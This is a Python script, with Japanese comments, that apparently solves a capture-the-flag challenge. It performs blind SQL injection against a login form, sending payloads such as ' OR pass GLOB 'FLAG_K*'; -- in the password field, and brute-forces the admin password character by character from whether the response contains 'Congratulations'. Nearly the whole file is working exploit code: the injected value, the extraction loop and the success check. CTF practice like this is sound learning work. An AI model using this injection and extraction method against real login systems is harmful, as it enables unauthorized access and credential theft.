import requests
import string


"""
次のURLにPOSTリクエストを送信して、リクエストデータに
パスワードを推測するSQLをインジェクションを渡して、真のパスワードの取得を試みる。
https://ctfq.u1tramarine.blue/q6/

' OR pass like 'flag_%'; --
-> likeだと大文字小文字を区別しないため、GLOBを使った方が良さそう。

' OR pass GLOB 'FLAG_K*'; --  これうまく行った
GLOBで使える※と？を総当たりする文字列から抜いて、試していくと良さそう。
"""
def try_login(password):
    url = "https://ctfq.u1tramarine.blue/q6/"
    data = {
        "id": "admin",
        # "pass": "{}".format(password)
        # "pass": "' OR pass like '{}%'; --".format(password)
        "pass": "' OR pass GLOB '{}*'; --".format(password)
    }
    response = requests.post(url, data=data)
    # print(response.text)
    # responseに「Congratulations」という文字列が含まれていたらパスワードが見つかったと判断する
    if "Congratulations" in response.text:
        print("Password found: " + password)
        return True
    return False        # print(response.text)

"""
flagで始まるパスワードを総当たりで探すメソッド
"""
def brute_force():
    password = ''
    string_list = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
    # string_listから*と?を削除する
    string_list = string_list.replace("*", "").replace("?", "")
    # 無限ループ
    for _ in range(1000):
        
        for j in string_list:
            print("Trying password: " + password + j)
            response = try_login(password + j)
            # responsがTrueだったらpassword変数にjを追加する
            if response:
                password += j
                break
        else:
            # 1周回り切ったということはパスワードが出尽くしている可能性がある。
            print('all character was tried. it may complete.')
            break

if __name__ == "__main__":
    brute_force()
